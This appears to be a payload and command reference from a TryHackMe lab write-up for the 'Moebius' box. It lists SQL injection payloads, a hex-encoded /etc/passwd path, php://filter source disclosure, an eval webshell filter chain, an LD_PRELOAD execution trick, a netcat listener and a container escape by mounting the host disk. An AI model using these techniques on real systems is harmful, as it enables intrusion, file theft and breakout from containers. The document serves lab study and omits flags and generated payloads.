# 💣 Moebius — Payload & Command Reference

> Payloads and commands are included for authorized TryHackMe laboratory use.

---

# SQL Injection

## Parameter Under Test

```text
/album.php?short_tag=cute
```

## UNION Validation

```text
moebius' UNION SELECT 0 -- -
```

## Boolean Expansion

```text
moebius' UNION SELECT 0 or 1=1 -- -
```

---

# Hexadecimal Path Representation

The application filtered `/` and `;`.

Example:

```text
/etc/passwd
```

Hexadecimal representation:

```text
0x2F6574632F706173737764
```

This was used within the SQL injection chain to avoid placing the filtered slash character directly in the request.

---

# PHP Source Disclosure

```text
php://filter/read=convert.base64-encode/resource=/var/www/html/index.php
```

The same technique was applied to application PHP files as required.

---

# PHP Filter Chain

The supplied material used:

```bash
python3 php_filter_chain_generator/php_filter_chain_generator.py \
  --chain '<?php eval($_REQUEST[0]);?>'
```

The exact generated filter chain is intentionally not reproduced because it is extremely long and adds little explanatory value to the case study.

---

# `LD_PRELOAD` Execution Path

The supplied workflow included:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

and a PHP execution path using:

```php
putenv('LD_PRELOAD=/tmp/shell.so');
mail('a','a','a','a');
```

The challenge-specific `shell.c` contents were not supplied and are therefore not reconstructed.

---

# Shell Listener

The supplied evidence used:

```bash
rlwrap nc -lvnp 4444
```

---

# Container Enumeration

```bash
id
grep CapEff /proc/self/status
docker ps -a
```

---

# Host Filesystem Mount

The supplied sequence was:

```bash
mkdir -p /mnt/tmp3
mount /dev/nvme0n1p1 /mnt/tmp3
```

---

# MariaDB Enumeration

```sql
SHOW DATABASES;
USE secret;
SHOW TABLES;
```

The final challenge value is intentionally excluded.

---

# Notes

This repository intentionally excludes:

* TryHackMe flags.
* Unnecessary secret values.
* Fabricated command output.
* Challenge-specific source code that was not supplied.
